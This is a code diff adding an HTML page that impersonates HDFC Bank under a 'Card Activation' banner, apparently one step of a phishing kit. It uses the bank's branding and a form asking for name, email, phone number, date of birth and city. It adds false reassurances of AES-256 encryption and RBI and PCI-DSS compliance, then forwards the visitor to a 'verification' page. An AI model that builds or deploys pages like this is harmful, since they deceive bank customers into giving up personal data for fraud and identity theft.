@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HDFC Bank - Card Activation</title>
+    <link rel="stylesheet" href="dashboard.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        .form-container {
+            padding: 20px;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .form-title {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .form-title h2 {
+            font-size: 22px;
+            color: var(--hdfc-blue);
+            margin-bottom: 8px;
+        }
+        .form-title p {
+            font-size: 14px;
+            color: var(--text-grey);
+        }
+        .input-group {
+            background: #fff;
+            padding: 20px;
+            border-radius: 16px;
+            box-shadow: var(--shadow);
+            margin-bottom: 20px;
+        }
+        .field {
+            margin-bottom: 20px;
+        }
+        .field label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-grey);
+            margin-bottom: 8px;
+        }
+        .field input {
+            width: 100%;
+            height: 48px;
+            background: #f8f9fa;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 0 15px;
+            font-size: 15px;
+            outline: none;
+            transition: border 0.3s;
+        }
+        .field input:focus {
+            border-color: var(--hdfc-blue);
+        }
+        .security-note {
+            text-align: center;
+            margin-top: 30px;
+        }
+        .security-note img {
+            width: 20px;
+            vertical-align: middle;
+            margin-right: 5px;
+        }
+        .security-note p {
+            font-size: 12px;
+            color: #4caf50;
+            font-weight: 600;
+        }
+        .disclaimer {
+            font-size: 11px;
+            color: #9aa0a6;
+            text-align: center;
+            margin-top: 15px;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+    <header class="main-header">
+        <div class="logo-container">
+            <img src="3e834224c5fd5554a019d56b4902b706.png" alt="HDFC Logo" class="brand-logo">
+            <span class="brand-text">HDFC BANK</span>
+        </div>
+    </header>
+
+    <main class="form-container">
+        <div class="form-title">
+            <p style="color: #4caf50; font-weight: 700; margin-bottom: 5px;">Card Activation</p>
+            <h2>Welcome to HDFC Card Online</h2>
+            <p>Secure & Instant Access to Your Card Services</p>
+        </div>
+
+        <form id="detailsForm">
+            <div class="input-group">
+                <div class="field">
+                    <input type="text" placeholder="Full Name *" required>
+                </div>
+                <div class="field">
+                    <input type="email" placeholder="Email *" required>
+                </div>
+                <div class="field">
+                    <input type="tel" placeholder="Phone Number *" required>
+                </div>
+                <div class="field">
+                    <input type="text" placeholder="Date of Birth (DD/MM/YYYY) *" required>
+                </div>
+                <div class="field">
+                    <input type="text" placeholder="City *" required>
+                </div>
+            </div>
+
+            <button type="submit" class="btn btn-primary btn-wide">Next →</button>
+        </form>
+
+        <div class="security-note">
+            <p>🔒 Secure Access Guaranteed</p>
+            <p style="color: #5f6368; font-weight: 400; font-size: 11px; margin-top: 5px;">Your data is protected with bank-grade encryption (AES-256)</p>
+            <p style="color: #9aa0a6; font-size: 10px; margin-top: 3px;">RBI • PCI-DSS Compliant • Verified Secure Server</p>
+        </div>
+
+        <p class="disclaimer">By continuing, you agree to our Terms & Privacy Policy.</p>
+    </main>
+
+    <script>
+        document.getElementById('detailsForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            window.location.href = 'verification.html';
+        });
+    </script>
+</body>
+</html>
